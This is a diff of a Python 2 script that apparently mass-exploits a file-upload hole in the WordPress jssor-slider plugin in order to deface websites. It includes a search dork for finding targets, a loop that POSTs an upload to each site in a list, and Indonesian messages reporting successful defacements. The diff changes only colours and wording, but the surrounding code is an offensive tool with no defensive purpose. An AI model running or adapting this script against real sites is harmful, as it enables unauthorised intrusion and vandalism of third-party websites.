@@ -24,7 +24,7 @@ banner = """
 * Dork: inurl:/wp-content/jssor-slider/
 * Author: TheSploit
 {}* ==> 
-""".format(Fore.BLUE, Fore.CYAN)
+""".format(Fore.RED, Fore.CYAN)
 
 print Style.BRIGHT
 print banner
@@ -46,15 +46,15 @@ if len(sys.argv) > 2:
 		r = requests.post(site + exploit, files=files, verify=False)
 		resposta = r.text
 		if "\"result\"" in resposta:
-			print Fore.GREEN + "[!] WEBSITE VULN COK: {}".format(site)
-			print Fore.BLUE + "[!] SUKSES NGEDEPES COK: {}/{}/{}".format(site, defacesdirectory, deface)
+			print Fore.GREEN + "[!] WEB INI VULN: {}".format(site)
+			print Fore.BLUE + "[!] Sukses Ke Depes: {}/{}/{}".format(site, defacesdirectory, deface)
 			sites_vuln.append("\n{}/{}/{}".format(site, defacesdirectory, deface))
 	 	else:
-	 		print Fore.GREEN + "[!] WEBSITE NGGA VULN COK: {}".format(site)
+	 		print Fore.RED + "[!] WEB INI TIDAK VULN: {}".format(site)
 
 	vulnsf.writelines(sites_vuln)
 	vulnsf.close()
 	filen.close()
 
 else:
-	print Fore.PURPLE+"[!] PENGGUNAAN: script.py <list> <deface.htm>"
+	print Fore.RED+"[!] PENGGUNAAN: script.py <list> <deface.htm>"
